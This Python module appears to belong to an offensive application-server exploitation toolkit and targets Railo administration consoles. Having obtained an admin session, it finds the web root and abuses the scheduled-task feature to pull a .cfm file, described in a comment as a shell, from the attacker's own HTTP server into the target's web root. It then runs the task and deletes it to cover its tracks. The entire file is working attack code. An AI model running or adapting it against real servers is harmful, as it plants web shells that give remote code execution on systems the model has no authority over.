from src.platform.railo.interfaces import RINTERFACES
from src.platform.railo.authenticate import checkAuth
from src.module.deploy_utils import _serve, waitServe, parse_war_path, killServe
from collections import OrderedDict
from os.path import abspath
from log import LOG
from threading import Thread
from re import findall
from time import sleep
import utility
import state


title = RINTERFACES.WEB
versions = ["3.0", "3.3", "4.0", "4.1", "4.2"]
global cookie
def deploy(fingerengine, fingerprint):
    """ Railo includes the same task scheduling function as ColdFusion
    """

    global cookie            

    cfm_path = abspath(fingerengine.options.deploy)            
    cfm_file = parse_war_path(cfm_path, True)
    dip = fingerengine.options.ip

    # set our session cookie
    cookie = checkAuth(dip, fingerprint.port, title)
    if not cookie:
        utility.Msg("Could not get auth to %s:%s" % (dip, fingerprint.port),
                                                    LOG.ERROR)
        return

    utility.Msg("Preparing to deploy {0}..".format(cfm_file))
    utility.Msg("Fetching web root..", LOG.DEBUG)

    # fetch web root; i.e. where we can read the shell
    root = fetch_webroot(dip, fingerprint)
    if not root:
        utility.Msg("Unable to fetch web root.", LOG.ERROR)
        return

    # create the scheduled task        
    utility.Msg("Web root found at %s" % root, LOG.DEBUG)
    utility.Msg("Creating scheduled task...")

    if not create_task(dip, fingerprint, cfm_file, root):
        return

    # invoke the task
    utility.Msg("Task %s created, invoking..." % cfm_file)
    run_task(dip, fingerprint, cfm_path)
        
    # remove the task
    utility.Msg("Cleaning up...")
    delete_task(dip, fingerprint, cfm_file)


def fetch_webroot(ip, fingerprint):
    """ Grab web root from the info page
    """

    global cookie            
    _cookie = cookie

    url = "http://{0}:{1}/railo-context/admin/".format(ip, fingerprint.port)
    if fingerprint.version in ["3.0"]:
        url += "server.cfm"
        _cookie = checkAuth(ip, fingerprint.port, RINTERFACES.SRV)
    else:
        url += "web.cfm"

    response = utility.requests_get(url, cookies=_cookie)
    if response.status_code is 200:

        if fingerprint.version in ["3.0"]:
            data = findall("path1\" value=\"(.*?)\" ", 
                            response.content.translate(None, "\n\t\r"))
        elif fingerprint.version in ["3.3"]:
            data = findall("Webroot</td><td class=\"tblContent\">(.*?)</td>", 
                            response.content.translate(None, "\n\t\r"))
        else:
            data = findall("Webroot</th><td>(.*?)</td>",
                            response.content.translate(None, "\n\t\r"))

        if len(data) > 0:
            return data[0]


def create_task(ip, fingerprint, cfm_file, root):
    """
    """

    global cookie            

    base = "http://{0}:{1}/railo-context/admin/web.cfm".format(ip, fingerprint.port)
    params = "?action=services.schedule&action2=create"
    data = OrderedDict([
                    ("name", cfm_file),
                    ("url", "http://{0}:{1}/{2}".format(
                           utility.local_address(), state.external_port,
                           cfm_file)),
                    ("interval", "once"),
                    ("start_day", "01"),
                    ("start_month", "01"),
                    ("start_year", "2020"),
                    ("start_hour", "00"),
                    ("start_minute", "00"),
                    ("start_second", "00"),
                    ("run", "create")
                     ])

    response = utility.requests_post(base + params, data=data, cookies=cookie)
    if not response.status_code is 200 and cfm_file not in response.content:
        return False
    
    # pull the CSRF for our newly minted task
    csrf = findall("task=(.*?)\"", response.content)
    if len(data) > 0:
        csrf = csrf[0]
    else:
        utility.Msg("Could not pull CSRF token of new task (failed to create?)", LOG.DEBUG)
        return False

    # proceed to edit the task; railo loses its mind if every var isnt here
    params = "?action=services.schedule&action2=edit&task=" + csrf
    data["port"] = state.external_port
    data["timeout"] = 50
    data["run"] = "update"
    data["publish"] = "yes"
    data["file"] = root + '\\' + cfm_file
    data["_interval"] = "once"
    data["username"] = ""
    data["password"] = ""
    data["proxyport"] = ""
    data["proxyserver"] = ""
    data["proxyuser"] = ""
    data["proxypassword"] = ""
    data["end_hour"] = ""
    data["end_minute"] = ""
    data["end_second"] = ""
    data["end_day"] = ""
    data["end_month"] = ""
    data["end_year"] = ""

    response = utility.requests_post(base + params, data=data, cookies=cookie)
    if response.status_code is 200 and cfm_file in response.content:
        return True

    return False        


def run_task(ip, fingerprint, cfm_path):
    """
    """

    global cookie
    cfm_file = parse_war_path(cfm_path, True)

    # kick up server
    server_thread = Thread(target=_serve, args=(cfm_path,))
    server_thread.start()
    sleep(2)

    base = "http://{0}:{1}/railo-context/admin/web.cfm".format(ip, fingerprint.port)
    params = "?action=services.schedule"
    data = OrderedDict([
                    ("row_1", "1"),
                    ("name_1", cfm_file),
                    ("mainAction", "execute")
                      ])

    response = utility.requests_post(base + params, data=data, cookies=cookie)
    if waitServe(server_thread):
        utility.Msg("{0} deployed to /{0}".format(cfm_file), LOG.SUCCESS)

    killServe()


def delete_task(ip, fingerprint, cfm_file):
    """
    """

    global cookie            
    
    base = "http://{0}:{1}/railo-context/admin/web.cfm".format(ip, fingerprint.port)
    params = "?action=services.schedule"
    data = OrderedDict([
                    ("row_1", "1"),
                    ("name_1", cfm_file),
                    ("mainAction", "delete")
                    ])

    response = utility.requests_post(base + params, data=data, cookies=cookie)
    if response.status_code is 200:
        return True
